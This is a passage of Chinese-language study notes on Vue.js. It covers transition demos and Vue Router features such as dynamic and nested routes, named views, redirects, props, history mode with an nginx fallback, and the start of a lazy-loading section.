<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/lodash.js/4.14.1/lodash.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;flip-list-demo&quot;</span> <span class="attr">class</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">v-on:click</span>=<span class="string">&quot;shuffle&quot;</span>&gt;</span>Shuffle<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">transition-group</span> <span class="attr">name</span>=<span class="string">&quot;flip-list&quot;</span> <span class="attr">tag</span>=<span class="string">&quot;ul&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">&quot;item in items&quot;</span> <span class="attr">v-bind:key</span>=<span class="string">&quot;item&quot;</span>&gt;</span></span><br><span class="line">      &#123;&#123; item &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">transition-group</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#flip-list-demo&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">items</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="attr">shuffle</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">items</span> = _.<span class="title function_">shuffle</span>(<span class="variable language_">this</span>.<span class="property">items</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.flip-list-move</span> &#123;</span><br><span class="line">  <span class="attribute">transition</span>: transform <span class="number">1s</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>状态过渡：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdnjs.cloudflare.com/ajax/libs/gsap/1.20.3/TweenMax.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;animated-number-demo&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">v-model.number</span>=<span class="string">&quot;number&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">step</span>=<span class="string">&quot;20&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123; animatedNumber &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>: <span class="string">&#x27;#animated-number-demo&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">number</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">tweenedNumber</span>: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="attr">animatedNumber</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">tweenedNumber</span>.<span class="title function_">toFixed</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="attr">number</span>: <span class="keyword">function</span>(<span class="params">newValue</span>) &#123;</span><br><span class="line">      <span class="title class_">TweenLite</span>.<span class="title function_">to</span>(<span class="variable language_">this</span>.<span class="property">$data</span>, <span class="number">0.5</span>, &#123; <span class="attr">tweenedNumber</span>: newValue &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="Router"><a href="#Router" class="headerlink" title="Router"></a>Router</h1><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue/dist/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vue-router/dist/vue-router.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello App!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 使用 router-link 组件来导航. --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 通过传入 `to` 属性指定链接. --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/foo&quot;</span>&gt;</span>Go to Foo<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/bar&quot;</span>&gt;</span>Go to Bar<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 路由出口 --&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 路由匹配到的组件将渲染在这里 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>


<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 0. 如果使用模块化机制编程，导入Vue和VueRouter，要调用 Vue.use(VueRouter)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义 (路由) 组件。</span></span><br><span class="line"><span class="comment">// 可以从其他文件 import 进来</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Foo</span> = &#123; <span class="attr">template</span>: <span class="string">&#x27;&lt;div&gt;foo&lt;/div&gt;&#x27;</span> &#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Bar</span> = &#123; <span class="attr">template</span>: <span class="string">&#x27;&lt;div&gt;bar&lt;/div&gt;&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 定义路由</span></span><br><span class="line"><span class="comment">// 每个路由应该映射一个组件。 其中&quot;component&quot; 可以是</span></span><br><span class="line"><span class="comment">// 通过 Vue.extend() 创建的组件构造器，</span></span><br><span class="line"><span class="comment">// 或者，只是一个组件配置对象。</span></span><br><span class="line"><span class="comment">// 我们晚点再讨论嵌套路由。</span></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">&#x27;/foo&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Foo</span> &#125;,</span><br><span class="line">  &#123; <span class="attr">path</span>: <span class="string">&#x27;/bar&#x27;</span>, <span class="attr">component</span>: <span class="title class_">Bar</span> &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 创建 router 实例，然后传 `routes` 配置</span></span><br><span class="line"><span class="comment">// 你还可以传别的配置参数, 不过先这么简单着吧。</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes <span class="comment">// (缩写) 相当于 routes: routes</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 创建和挂载根实例。</span></span><br><span class="line"><span class="comment">// 记得要通过 router 配置参数注入路由，</span></span><br><span class="line"><span class="comment">// 从而让整个应用都有路由功能</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  router</span><br><span class="line">&#125;).$mount(<span class="string">&#x27;#app&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在，应用已经启动了！</span></span><br></pre></td></tr></table></figure>

<p>组件内访问路由器：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Home.vue</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="title function_">username</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="comment">// 我们很快就会看到 `params` 是什么</span></span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">$route</span>.<span class="property">params</span>.<span class="property">username</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>: &#123;</span><br><span class="line">    <span class="title function_">goBack</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">history</span>.<span class="property">length</span> &gt; <span class="number">1</span> ? <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">go</span>(-<span class="number">1</span>) : <span class="variable language_">this</span>.<span class="property">$router</span>.<span class="title function_">push</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="路由的动态匹配"><a href="#路由的动态匹配" class="headerlink" title="路由的动态匹配"></a>路由的动态匹配</h2><p>一个“路径参数”使用冒号 <code>:</code> 标记。当匹配到一个路由时，参数值会被设置到 this.$route.params，可以在每个组件内使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    <span class="comment">// 动态路径参数 以冒号开头</span></span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/user/:id&#x27;</span>, <span class="attr">component</span>: <span class="title class_">User</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="响应路由参数的变化"><a href="#响应路由参数的变化" class="headerlink" title="响应路由参数的变化"></a>响应路由参数的变化</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;...&#x27;</span>,</span><br><span class="line">  <span class="attr">watch</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;$route&#x27;</span> (to, <span class="keyword">from</span>) &#123;</span><br><span class="line">      <span class="comment">// 对路由变化作出响应...</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;...&#x27;</span>,</span><br><span class="line">  beforeRouteUpdate (to, <span class="keyword">from</span>, next) &#123;</span><br><span class="line">    <span class="comment">// react to route changes...</span></span><br><span class="line">    <span class="comment">// don&#x27;t forget to call next()</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="捕获-404"><a href="#捕获-404" class="headerlink" title="捕获 404"></a>捕获 404</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 会匹配所有路径</span></span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;*&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 会匹配以 `/user-` 开头的任意路径</span></span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/user-*&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当使用一个通配符时，$route.params 内会自动添加一个名为 pathMatch 参数。它包含了 URL 通过通配符被匹配的部分。</p>
<h2 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h2><p>使用 path-to-regexp 作为引擎。</p>
<h2 id="嵌套路由"><a href="#嵌套路由" class="headerlink" title="嵌套路由"></a>嵌套路由</h2><p>使用children参数：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/user/:id&#x27;</span>, <span class="attr">component</span>: <span class="title class_">User</span>,</span><br><span class="line">      <span class="attr">children</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 当 /user/:id/profile 匹配成功，</span></span><br><span class="line">          <span class="comment">// UserProfile 会被渲染在 User 的 &lt;router-view&gt; 中</span></span><br><span class="line">          <span class="attr">path</span>: <span class="string">&#x27;profile&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>: <span class="title class_">UserProfile</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">// 当 /user/:id/posts 匹配成功</span></span><br><span class="line">          <span class="comment">// UserPosts 会被渲染在 User 的 &lt;router-view&gt; 中</span></span><br><span class="line">          <span class="attr">path</span>: <span class="string">&#x27;posts&#x27;</span>,</span><br><span class="line">          <span class="attr">component</span>: <span class="title class_">UserPosts</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>此时，基于上面的配置，当你访问 &#x2F;user&#x2F;foo 时，User 的出口是不会渲染任何东西，这是因为没有匹配到合适的子路由。如果你想要渲染点什么，可以提供一个 空的 子路由：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/user/:id&#x27;</span>, <span class="attr">component</span>: <span class="title class_">User</span>,</span><br><span class="line">      <span class="attr">children</span>: [</span><br><span class="line">        <span class="comment">// 当 /user/:id 匹配成功，</span></span><br><span class="line">        <span class="comment">// UserHome 会被渲染在 User 的 &lt;router-view&gt; 中</span></span><br><span class="line">        &#123; <span class="attr">path</span>: <span class="string">&#x27;&#x27;</span>, <span class="attr">component</span>: <span class="title class_">UserHome</span> &#125;,</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ...其他子路由</span></span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="编程式导航"><a href="#编程式导航" class="headerlink" title="编程式导航"></a>编程式导航</h2><p>除了使用 <code>&lt;router-link&gt;</code> 创建 a 标签来定义导航链接，我们还可以借助 router 的实例方法，通过编写代码<code>this.$router.push</code>来实现。点击 <code>&lt;router-link :to=&quot;...&quot;&gt;</code> 等同于调用 <code>router.push(...)</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字符串</span></span><br><span class="line">router.<span class="title function_">push</span>(<span class="string">&#x27;home&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对象</span></span><br><span class="line">router.<span class="title function_">push</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;home&#x27;</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 命名的路由</span></span><br><span class="line">router.<span class="title function_">push</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;user&#x27;</span>, <span class="attr">params</span>: &#123; <span class="attr">userId</span>: <span class="string">&#x27;123&#x27;</span> &#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 带查询参数，变成 /register?plan=private</span></span><br><span class="line">router.<span class="title function_">push</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;register&#x27;</span>, <span class="attr">query</span>: &#123; <span class="attr">plan</span>: <span class="string">&#x27;private&#x27;</span> &#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userId = <span class="string">&#x27;123&#x27;</span></span><br><span class="line">router.<span class="title function_">push</span>(&#123; <span class="attr">name</span>: <span class="string">&#x27;user&#x27;</span>, <span class="attr">params</span>: &#123; userId &#125;&#125;) <span class="comment">// -&gt; /user/123</span></span><br><span class="line">router.<span class="title function_">push</span>(&#123; <span class="attr">path</span>: <span class="string">`/user/<span class="subst">$&#123;userId&#125;</span>`</span> &#125;) <span class="comment">// -&gt; /user/123</span></span><br><span class="line"><span class="comment">// 这里的 params 不生效，如果提供了 path，params 会被忽略</span></span><br><span class="line">router.<span class="title function_">push</span>(&#123; <span class="attr">path</span>: <span class="string">&#x27;/user&#x27;</span>, <span class="attr">params</span>: &#123; userId &#125;&#125;) <span class="comment">// -&gt; /user</span></span><br></pre></td></tr></table></figure>

<p>router.replace(location, onComplete?, onAbort?)</p>
<p>跟 router.push 很像，唯一的不同就是，它不会向 history 添加新记录，而是跟它的方法名一样 —— 替换掉当前的 history 记录。</p>
<p>router.go(n)</p>
<p>这个方法的参数是一个整数，意思是在 history 记录中向前或者后退多少步，类似 window.history.go(n)。</p>
<h2 id="命名路由"><a href="#命名路由" class="headerlink" title="命名路由"></a>命名路由</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/user/:userId&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">User</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">&quot;&#123; name: &#x27;user&#x27;, params: &#123; userId: 123 &#125;&#125;&quot;</span>&gt;</span>User<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="命名视图"><a href="#命名视图" class="headerlink" title="命名视图"></a>命名视图</h2><p>有时候想同时 (同级) 展示多个视图，而不是嵌套展示，例如创建一个布局，有 sidebar (侧导航) 和 main (主内容) 两个视图，这个时候命名视图就派上用场了。你可以在界面中拥有多个单独命名的视图，而不是只有一个单独的出口。如果 router-view 没有设置名字，那么默认为 default。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">router-view</span> <span class="attr">class</span>=<span class="string">&quot;view one&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-view</span> <span class="attr">class</span>=<span class="string">&quot;view two&quot;</span> <span class="attr">name</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">router-view</span> <span class="attr">class</span>=<span class="string">&quot;view three&quot;</span> <span class="attr">name</span>=<span class="string">&quot;b&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">      <span class="attr">components</span>: &#123;</span><br><span class="line">        <span class="attr">default</span>: <span class="title class_">Foo</span>,</span><br><span class="line">        <span class="attr">a</span>: <span class="title class_">Bar</span>,</span><br><span class="line">        <span class="attr">b</span>: <span class="title class_">Baz</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="嵌套命名视图"><a href="#嵌套命名视图" class="headerlink" title="嵌套命名视图"></a>嵌套命名视图</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- UserSettings.vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>User Settings<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">NavBar</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">router-view</span> <span class="attr">name</span>=<span class="string">&quot;helper&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/settings&#x27;</span>,</span><br><span class="line">  <span class="comment">// 你也可以在顶级路由就配置命名视图</span></span><br><span class="line">  <span class="attr">component</span>: <span class="title class_">UserSettings</span>,</span><br><span class="line">  <span class="attr">children</span>: [&#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;emails&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="title class_">UserEmailsSubscriptions</span></span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;profile&#x27;</span>,</span><br><span class="line">    <span class="attr">components</span>: &#123;</span><br><span class="line">      <span class="attr">default</span>: <span class="title class_">UserProfile</span>,</span><br><span class="line">      <span class="attr">helper</span>: <span class="title class_">UserProfilePreview</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="重定向和别名"><a href="#重定向和别名" class="headerlink" title="重定向和别名"></a>重定向和别名</h2><p>重定向：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/a&#x27;</span>, <span class="attr">redirect</span>: <span class="string">&#x27;/b&#x27;</span> &#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/a&#x27;</span>, <span class="attr">redirect</span>: &#123; <span class="attr">name</span>: <span class="string">&#x27;foo&#x27;</span> &#125;&#125;,</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/a&#x27;</span>, <span class="attr">redirect</span>: <span class="function"><span class="params">to</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">// 方法接收 目标路由 作为参数</span></span><br><span class="line">      <span class="comment">// return 重定向的 字符串路径/路径对象</span></span><br><span class="line">    &#125;&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>别名：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/a&#x27;</span>, <span class="attr">component</span>: A, <span class="attr">alias</span>: <span class="string">&#x27;/b&#x27;</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="路由组件传参"><a href="#路由组件传参" class="headerlink" title="路由组件传参"></a>路由组件传参</h2><p>在组件中使用 $route 会使之与其对应路由形成高度耦合，从而使组件只能在某些特定的 URL 上使用，限制了其灵活性。</p>
<p>使用 props 将组件和路由解耦：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;&lt;div&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/user/:id&#x27;</span>, <span class="attr">component</span>: <span class="title class_">User</span> &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">User</span> = &#123;</span><br><span class="line">  <span class="attr">props</span>: [<span class="string">&#x27;id&#x27;</span>],</span><br><span class="line">  <span class="attr">template</span>: <span class="string">&#x27;&lt;div&gt;User &#123;&#123; id &#125;&#125;&lt;/div&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [</span><br><span class="line">    &#123; <span class="attr">path</span>: <span class="string">&#x27;/user/:id&#x27;</span>, <span class="attr">component</span>: <span class="title class_">User</span>, <span class="attr">props</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">    <span class="comment">// 对于包含命名视图的路由，你必须分别为每个命名视图添加 `props` 选项：</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/user/:id&#x27;</span>,</span><br><span class="line">      <span class="attr">components</span>: &#123; <span class="attr">default</span>: <span class="title class_">User</span>, <span class="attr">sidebar</span>: <span class="title class_">Sidebar</span> &#125;,</span><br><span class="line">      <span class="attr">props</span>: &#123; <span class="attr">default</span>: <span class="literal">true</span>, <span class="attr">sidebar</span>: <span class="literal">false</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h2 id="History-模式"><a href="#History-模式" class="headerlink" title="History 模式"></a>History 模式</h2><p>vue-router 默认 hash 模式 —— 使用 URL 的 hash 来模拟一个完整的 URL，于是当 URL 改变时，页面不会重新加载。</p>
<p>如果不想要很丑的 hash，我们可以用路由的 history 模式，这种模式充分利用 history.pushState API 来完成 URL 跳转而无须重新加载页面。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;history&#x27;</span>,</span><br><span class="line">  <span class="attr">routes</span>: [...]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>不过这种模式要玩好，还需要后台配置支持。因为我们的应用是个单页客户端应用，如果后台没有正确的配置，当用户在浏览器直接访问 <a href="http://oursite.com/user/id">http://oursite.com/user/id</a> 就会返回 404，这就不好看了。</p>
<p>后台nginx配置：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">  <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="懒加载"><a href="#懒加载" class="headerlink" title="懒加载"></a>懒加载</h2><p>首先，可以将异步组件定义为返回一个 Promise 的工厂函数 (该函数返回的 Promise 应该 resolve 组件本身)：</p>
